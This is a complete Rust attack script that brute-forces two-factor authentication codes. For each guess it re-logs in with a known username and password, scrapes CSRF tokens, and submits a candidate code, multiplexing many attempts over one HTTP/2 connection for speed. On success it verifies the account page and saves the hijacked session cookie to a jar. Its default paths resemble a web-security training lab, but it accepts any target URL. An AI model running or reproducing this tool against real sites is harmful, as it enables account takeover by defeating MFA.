#!/usr/bin/env rust-script
//! name: h2_relogin_brute
//! description: 重登录型 2FA 码枚举件(h2 多路复用版)- 每个候选码一条完整会话链(GET /login 取 csrf → POST /login 首因子 → GET /login2 取 csrf → POST /login2 投码),因为服务端对错误码弃会话、每次猜码都要重新登录;所有链复用同一条 HTTP/2 长连接多路复用,吞吐不再被 HTTP/1.1 的每请求 TLS 握手拖死;首命中即停,胜出会话复验 --confirm-path 并写回 jar,一个信封给出中码、逐步状态直方图、速率与失败分类
//! version: 1.0.0
//! args: <base-url> --user U --password P [--start 0] [--end 9999] [--len 4] [--streams 16] [--jar PATH] [--confirm-path /my-account] [--login-path /login] [--mfa-path /login2] [--field mfa-code] [--timeout-ms N] [--snippet N] [--selftest]
//! keywords: 漏洞猎手套件, 2fa, mfa, brute, otp, relogin, h2, http2, multiplex, authentication, 安全码
//!
//! ```cargo
//! [dependencies]
//! tokio = { version = "1", features = ["rt-multi-thread", "net", "time", "macros", "io-util", "sync"] }
//! tokio-rustls = "0.26"
//! webpki-roots = "0.26"
//! h2 = "0.4"
//! http = "1"
//! url = "2"
//! ```

use pi_rust_lib::bytes::Bytes;
use pi_rust_lib::serde_json::{json, Value};
use std::collections::BTreeMap;
use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};
use tokio::net::TcpStream;
use tokio_rustls::rustls::pki_types::ServerName;
use tokio_rustls::rustls::{ClientConfig, RootCertStore};
use tokio_rustls::TlsConnector;
use url::Url;

struct Cfg {
    base: String,
    user: String,
    password: String,
    start: usize,
    end: usize,
    len: usize,
    streams: usize,
    jar: Option<String>,
    confirm_path: String,
    login_path: String,
    mfa_path: String,
    field: String,
    timeout_ms: u64,
    snippet: usize,
}

struct Resp {
    status: u16,
    headers: Vec<(String, String)>,
    body: Vec<u8>,
}

impl Resp {
    fn header(&self, name: &str) -> String {
        self.headers
            .iter()
            .find(|(k, _)| k.eq_ignore_ascii_case(name))
            .map(|(_, v)| v.clone())
            .unwrap_or_default()
    }
    fn text(&self) -> String {
        String::from_utf8_lossy(&self.body).to_string()
    }
}

#[tokio::main]
async fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        selftest();
        return;
    }
    let mut cfg = Cfg {
        base: String::new(),
        user: String::new(),
        password: String::new(),
        start: 0,
        end: 9999,
        len: 4,
        streams: 16,
        jar: None,
        confirm_path: "/my-account".to_string(),
        login_path: "/login".to_string(),
        mfa_path: "/login2".to_string(),
        field: "mfa-code".to_string(),
        timeout_ms: 20000,
        snippet: 240,
    };
    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--user" => { i += 1; cfg.user = a(&args, i); }
            "--password" => { i += 1; cfg.password = a(&args, i); }
            "--start" => { i += 1; cfg.start = a(&args, i).parse().unwrap_or(0); }
            "--end" => { i += 1; cfg.end = a(&args, i).parse().unwrap_or(9999); }
            "--len" => { i += 1; cfg.len = a(&args, i).parse().unwrap_or(4); }
            "--streams" => { i += 1; cfg.streams = a(&args, i).parse().unwrap_or(16).max(1); }
            "--jar" => { i += 1; cfg.jar = Some(a(&args, i)); }
            "--confirm-path" => { i += 1; cfg.confirm_path = a(&args, i); }
            "--login-path" => { i += 1; cfg.login_path = a(&args, i); }
            "--mfa-path" => { i += 1; cfg.mfa_path = a(&args, i); }
            "--field" => { i += 1; cfg.field = a(&args, i); }
            "--timeout-ms" => { i += 1; cfg.timeout_ms = a(&args, i).parse().unwrap_or(20000); }
            "--snippet" => { i += 1; cfg.snippet = a(&args, i).parse().unwrap_or(240); }
            other if !other.starts_with("--") && cfg.base.is_empty() => cfg.base = other.trim_end_matches('/').to_string(),
            _ => {}
        }
        i += 1;
    }
    if cfg.base.is_empty() || cfg.user.is_empty() || cfg.password.is_empty() {
        pi_rust_lib::report::failure(
            "h2_relogin_brute",
            "missing base-url/--user/--password",
            "usage: h2_relogin_brute <base-url> --user U --password P [--end 9999] [--streams 16] [--jar PATH]",
        );
        std::process::exit(2);
    }
    if cfg.end < cfg.start {
        pi_rust_lib::report::failure("h2_relogin_brute", "empty range: --end < --start", "swap the bounds and rerun");
        std::process::exit(2);
    }
    let parsed = match Url::parse(&cfg.base) {
        Ok(u) => u,
        Err(e) => {
            pi_rust_lib::report::failure("h2_relogin_brute", &format!("bad base url: {e}"), "pass an https origin");
            std::process::exit(2);
        }
    };
    let host = parsed.host_str().unwrap_or("").to_string();
    let port = parsed.port_or_known_default().unwrap_or(443);
    let login_url = format!("{}{}", cfg.base, cfg.login_path);
    let mfa_url = format!("{}{}", cfg.base, cfg.mfa_path);

    let mut roots = RootCertStore::empty();
    roots.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
    let mut tls_config = ClientConfig::builder()
        .with_root_certificates(roots)
        .with_no_client_auth();
    tls_config.alpn_protocols = vec![b"h2".to_vec()];
    let tls = Arc::new(tls_config);

    let tcp = match TcpStream::connect((host.as_str(), port)).await {
        Ok(t) => t,
        Err(e) => {
            pi_rust_lib::report::failure("h2_relogin_brute", &format!("tcp connect failed: {e}"), "check the instance url");
            std::process::exit(1);
        }
    };
    tcp.set_nodelay(true).ok();
    let tls_stream = match TlsConnector::from(tls)
        .connect(ServerName::try_from(host.clone()).expect("sni"), tcp)
        .await
    {
        Ok(s) => s,
        Err(e) => {
            pi_rust_lib::report::failure("h2_relogin_brute", &format!("tls handshake failed: {e}"), "check the instance url");
            std::process::exit(1);
        }
    };
    let alpn = tls_stream
        .get_ref()
        .1
        .alpn_protocol()
        .map(|p| String::from_utf8_lossy(p).to_string())
        .unwrap_or_default();
    if alpn != "h2" {
        pi_rust_lib::report::failure(
            "h2_relogin_brute",
            &format!("server negotiated ALPN '{alpn}', not h2"),
            "use mfa_relogin_brute (HTTP/1.1 transport) for this target",
        );
        std::process::exit(1);
    }
    let (send, conn) = h2::client::handshake(tls_stream).await.expect("h2 handshake");
    tokio::spawn(async move {
        let _ = conn.await;
    });
    let send = match send.ready().await {
        Ok(s) => s,
        Err(e) => {
            pi_rust_lib::report::failure("h2_relogin_brute", &format!("h2 not ready: {e}"), "retry");
            std::process::exit(1);
        }
    };

    let hit_flag = Arc::new(AtomicBool::new(false));
    let next = Arc::new(AtomicUsize::new(cfg.start));
    let attempts = Arc::new(AtomicUsize::new(0));
    let requests = Arc::new(AtomicUsize::new(0));
    let hist: Arc<Mutex<BTreeMap<String, usize>>> = Arc::new(Mutex::new(BTreeMap::new()));
    let found: Arc<Mutex<Option<Value>>> = Arc::new(Mutex::new(None));
    let cfg = Arc::new(cfg);

    let started = Instant::now();
    let mut tasks = Vec::new();
    for _ in 0..cfg.streams {
        let mut send = send.clone();
        let hit_flag = hit_flag.clone();
        let next = next.clone();
        let attempts = attempts.clone();
        let requests = requests.clone();
        let hist = hist.clone();
        let found = found.clone();
        let cfg = cfg.clone();
        let login_url = login_url.clone();
        let mfa_url = mfa_url.clone();
        tasks.push(tokio::spawn(async move {
            loop {
                if hit_flag.load(Ordering::SeqCst) {
                    break;
                }
                let n = next.fetch_add(1, Ordering::SeqCst);
                if n > cfg.end {
                    break;
                }
                let code = pad(n, cfg.len);
                attempts.fetch_add(1, Ordering::SeqCst);
                if let Some(record) = chain(&mut send, &cfg, &login_url, &mfa_url, &code, &requests, &hist).await {
                    hit_flag.store(true, Ordering::SeqCst);
                    if let Ok(mut slot) = found.lock() {
                        if slot.is_none() {
                            *slot = Some(record);
                        }
                    }
                    break;
                }
            }
        }));
    }
    for t in tasks {
        let _ = t.await;
    }
    let elapsed_ms = started.elapsed().as_millis() as u64;

    let hit = found.lock().ok().and_then(|s| s.clone());
    let histogram: Vec<Value> = hist
        .lock()
        .map(|h| h.iter().map(|(k, c)| json!({"step": k, "count": c})).collect())
        .unwrap_or_default();

    let mut confirm = Value::Null;
    let mut jar_updated = false;
    if let Some(h) = &hit {
        let cookie = h.get("session_cookie").and_then(|v| v.as_str()).unwrap_or("").to_string();
        if !cookie.is_empty() {
            let mut send2 = send.clone();
            let target = format!("{}{}", cfg.base, cfg.confirm_path);
            let mut reply = one(&mut send2, "GET", &target, &cookie, None, cfg.timeout_ms).await;
            let mut hops = 1;
            while hops < 3 {
                match &reply {
                    Ok(r) if (300..400).contains(&r.status) => {
                        let loc = r.header("location");
                        if loc.is_empty() {
                            break;
                        }
                        let next_url = if loc.starts_with("http") { loc } else { format!("{}{}", cfg.base, loc) };
                        reply = one(&mut send2, "GET", &next_url, &cookie, None, cfg.timeout_ms).await;
                        hops += 1;
                    }
                    _ => break,
                }
            }
            match reply {
                Ok(r) => {
                    confirm = json!({
                        "url": target,
                        "status": r.status,
                        "snippet": collapse(&r.text(), cfg.snippet),
                    });
                }
                Err(e) => {
                    confirm = json!({"url": target, "error": e});
                }
            }
            if let Some(jar_path) = cfg.jar.as_deref() {
                let mut jar: BTreeMap<String, BTreeMap<String, String>> = std::fs::read_to_string(jar_path)
                    .ok()
                    .and_then(|s| pi_rust_lib::serde_json::from_str(&s).ok())
                    .unwrap_or_default();
                let entry = jar.entry(host.clone()).or_default();
                for pair in cookie.split("; ") {
                    if let Some((k, v)) = pair.split_once('=') {
                        entry.insert(k.trim().to_string(), v.trim().to_string());
                    }
                }
                if pi_rust_lib::serde_json::to_string(&jar).ok().map(|t| std::fs::write(jar_path, t).is_ok()).unwrap_or(false) {
                    jar_updated = true;
                }
            }
        }
    }

    let reqs = requests.load(Ordering::SeqCst) as u64;
    let att = attempts.load(Ordering::SeqCst) as u64;
    let data = json!({
        "base": cfg.base,
        "alpn": alpn,
        "range": format!("{}-{}", cfg.start, cfg.end),
        "code_len": cfg.len,
        "streams": cfg.streams,
        "attempts": att,
        "requests": reqs,
        "elapsed_ms": elapsed_ms,
        "reqs_per_sec": if elapsed_ms > 0 { json!(reqs * 1000 / elapsed_ms) } else { json!(0) },
        "status_histogram": histogram,
        "hit": hit,
        "confirm": confirm,
        "jar_updated": jar_updated,
    });
    let cta = if data["hit"].is_null() {
        "no code in range; re-run (the code rotates on a TTL) or widen --end/--len, and check the step histogram for login-side throttling"
    } else {
        "confirm snippet proves the account; the session is in the jar"
    };
    pi_rust_lib::report::success("h2_relogin_brute", data, cta).expect("report success");
}

fn a(args: &[String], i: usize) -> String {
    args.get(i).cloned().unwrap_or_default()
}

fn pad(n: usize, len: usize) -> String {
    let s = n.to_string();
    if s.len() >= len {
        s
    } else {
        format!("{}{}", "0".repeat(len - s.len()), s)
    }
}

fn find_csrf(html: &str) -> Option<String> {
    let idx = html.find("name=\"csrf\"")?;
    let rest = &html[idx..];
    let v = rest.find("value=\"")?;
    let rest = &rest[v + 7..];
    let end = rest.find('"')?;
    Some(rest[..end].to_string())
}

fn apply_cookies(jar: &mut BTreeMap<String, String>, r: &Resp) {
    for raw in r.headers.iter().filter(|(k, _)| k.eq_ignore_ascii_case("set-cookie")).map(|(_, v)| v.clone()) {
        let first = raw.split(';').next().unwrap_or("").trim().to_string();
        if let Some((k, v)) = first.split_once('=') {
            jar.insert(k.trim().to_string(), v.trim().to_string());
        }
    }
}

fn cookie_header(jar: &BTreeMap<String, String>) -> String {
    jar.iter().map(|(k, v)| format!("{k}={v}")).collect::<Vec<_>>().join("; ")
}

/// One guess: a whole session chain on the shared h2 connection.
async fn chain(
    send: &mut h2::client::SendRequest<Bytes>,
    cfg: &Cfg,
    login_url: &str,
    mfa_url: &str,
    code: &str,
    requests: &AtomicUsize,
    hist: &Mutex<BTreeMap<String, usize>>,
) -> Option<Value> {
    let note = |tag: &str, status: u16| {
        requests.fetch_add(1, Ordering::SeqCst);
        if let Ok(mut h) = hist.lock() {
            *h.entry(format!("{tag}/{status}")).or_insert(0) += 1;
        }
    };
    let tmo = Duration::from_millis(cfg.timeout_ms);
    let mut jar: BTreeMap<String, String> = BTreeMap::new();

    // 1. login page -> first csrf
    let r1 = one(send, "GET", login_url, "", None, cfg.timeout_ms).await.ok()?;
    note("login_get", r1.status);
    apply_cookies(&mut jar, &r1);
    let csrf1 = find_csrf(&r1.text())?;

    // 2. first factor -> fresh /login2 session
    let body1 = format!("csrf={}&username={}&password={}", csrf1, cfg.user, cfg.password);
    let r2 = one(send, "POST", login_url, &cookie_header(&jar), Some(&body1), cfg.timeout_ms).await.ok()?;
    note("login_post", r2.status);
    apply_cookies(&mut jar, &r2);
    if r2.status != 302 {
        return None;
    }

    // 3. 2FA page -> second csrf
    let r3 = one(send, "GET", mfa_url, &cookie_header(&jar), None, cfg.timeout_ms).await.ok()?;
    note("mfa_get", r3.status);
    apply_cookies(&mut jar, &r3);
    let csrf2 = find_csrf(&r3.text())?;

    // 4. the guess itself
    let body2 = format!("csrf={}&{}={}", csrf2, cfg.field, code);
    let r4 = match tokio::time::timeout(tmo, one(send, "POST", mfa_url, &cookie_header(&jar), Some(&body2), cfg.timeout_ms)).await {
        Ok(Ok(r)) => r,
        _ => {
            note("mfa_post/timeout", 0);
            return None;
        }
    };
    note("mfa_post", r4.status);
    apply_cookies(&mut jar, &r4);

    if (300..400).contains(&r4.status) {
        return Some(json!({
            "code": code,
            "status": r4.status,
            "location": r4.header("location"),
            "session_cookie": cookie_header(&jar),
            "set_cookie": r4.headers.iter().filter(|(k, _)| k.eq_ignore_ascii_case("set-cookie")).map(|(_, v)| v.split('=').next().unwrap_or("").to_string()).collect::<Vec<_>>(),
            "snapshot": collapse(&r4.text(), cfg.snippet),
        }));
    }
    None
}

async fn one(
    send: &mut h2::client::SendRequest<Bytes>,
    method: &str,
    url: &str,
    cookies: &str,
    body: Option<&str>,
    timeout_ms: u64,
) -> Result<Resp, String> {
    send.clone().ready().await.map_err(|e| e.to_string())?;
    let mut builder = http::Request::builder()
        .method(method)
        .uri(url)
        .header("user-agent", "h2-relogin-brute");
    if !cookies.is_empty() {
        builder = builder.header("cookie", cookies);
    }
    if body.is_some() {
        builder = builder.header("content-type", "application/x-www-form-urlencoded");
    }
    let req = builder.body(()).map_err(|e| e.to_string())?;
    let (resp, mut stream) = send.send_request(req, body.is_none()).map_err(|e| e.to_string())?;
    if let Some(b) = body {
        stream.send_data(Bytes::from(b.to_string()), true).map_err(|e| e.to_string())?;
    }
    let response = match tokio::time::timeout(Duration::from_millis(timeout_ms), resp).await {
        Ok(Ok(r)) => r,
        Ok(Err(e)) => return Err(e.to_string()),
        Err(_) => return Err("response timeout".to_string()),
    };
    let status = response.status().as_u16();
    let headers: Vec<(String, String)> = response
        .headers()
        .iter()
        .map(|(k, v)| (k.as_str().to_string(), String::from_utf8_lossy(v.as_bytes()).to_string()))
        .collect();
    let mut body_stream = response.into_body();
    let mut out: Vec<u8> = Vec::new();
    let read = async {
        while let Some(chunk) = body_stream.data().await {
            match chunk {
                Ok(bytes) => {
                    let _ = body_stream.flow_control().release_capacity(bytes.len());
                    out.extend_from_slice(&bytes);
                }
                Err(_) => break,
            }
        }
        let _ = body_stream.trailers().await;
    };
    let _ = tokio::time::timeout(Duration::from_millis(timeout_ms), read).await;
    Ok(Resp { status, headers, body: out })
}

fn collapse(text: &str, limit: usize) -> String {
    let one: String = text.split_whitespace().collect::<Vec<_>>().join(" ");
    if one.len() > limit {
        format!("{}...", &one[..limit.min(one.len())])
    } else {
        one
    }
}

fn selftest() {
    let page = r#"<form><input required type="hidden" name="csrf" value="AbC123"></form>"#;
    let csrf_ok = find_csrf(page).as_deref() == Some("AbC123");
    let pad_ok = pad(7, 4) == "0007" && pad(9999, 4) == "9999";
    let mut jar: BTreeMap<String, String> = BTreeMap::new();
    let fake = Resp {
        status: 200,
        headers: vec![
            ("Set-Cookie".to_string(), "session=zz; Secure; HttpOnly".to_string()),
            ("set-cookie".to_string(), "x=1; Path=/".to_string()),
        ],
        body: Vec::new(),
    };
    apply_cookies(&mut jar, &fake);
    let jar_ok = cookie_header(&jar) == "session=zz; x=1";
    let snippet_ok = collapse("a\n  b", 10) == "a b";
    let receipt = csrf_ok && pad_ok && jar_ok && snippet_ok;
    let data = json!({"selftest": if receipt {"ok"} else {"fail"}, "csrf": csrf_ok, "pad": pad_ok, "cookie": jar_ok, "collapse": snippet_ok});
    if receipt {
        pi_rust_lib::report::success("h2_relogin_brute", data, "selftest passed; run against the target").expect("report");
    } else {
        pi_rust_lib::report::failure("h2_relogin_brute", "selftest failed", "inspect csrf/pad/cookie assertions");
        std::process::exit(1);
    }
}
